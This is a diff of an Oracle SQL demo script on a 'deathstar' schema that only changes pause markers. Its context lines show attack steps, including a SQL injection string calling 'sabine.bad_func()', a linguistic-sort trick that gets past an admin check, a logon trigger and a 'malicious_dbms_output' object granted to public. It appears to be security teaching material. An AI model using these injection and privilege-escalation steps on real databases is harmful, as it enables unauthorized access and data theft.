@@ -10,7 +10,7 @@ select * from deathstar_rooms;
 select * from deathstar_rooms;
 #pause
 
-#pause--*
+#pause/**/
 
 
 
@@ -59,7 +59,7 @@ end;
 /
 #pause
 
-#pause--*
+#pause/**/
 select code from deathstar_rooms;
 #pause
 select * from user_roles;
@@ -72,7 +72,7 @@ select * from user_roles;
 select * from log_201911;
 #pause
 
-#pause--*
+#pause/**/
 
 connect sabine/sabine@localhost:1522/ORCLPDB1
 #pause
@@ -107,7 +107,7 @@ select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') fr
 select * from secret_dump;
 #pause
 
-#pause--*
+#pause/**/
 
 ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
 #pause
@@ -116,7 +116,7 @@ select deathstar.is_admin('aDMIN') from dual;
 select deathstar.is_admin('Ädmin') from dual;
 #pause
 
-#pause--*
+#pause/**/
 
 create or replace trigger trg_client_detection
 after logon
@@ -164,7 +164,7 @@ end;
 grant execute on malicious_dbms_output to public;
 #pause
 select * from user_role_privs;
-#pause--*
+#pause/**/
 
 select * from user_role_privs;
 #pause
@@ -183,7 +183,7 @@ select deathstar.room_info.get_room_id('Vader') from dual;
 --  (_/                                               (_/   '           .-/
 --                                                                     (_/
 
-#pause--*
+#pause/**/
 
 
 select * from user_role_privs;
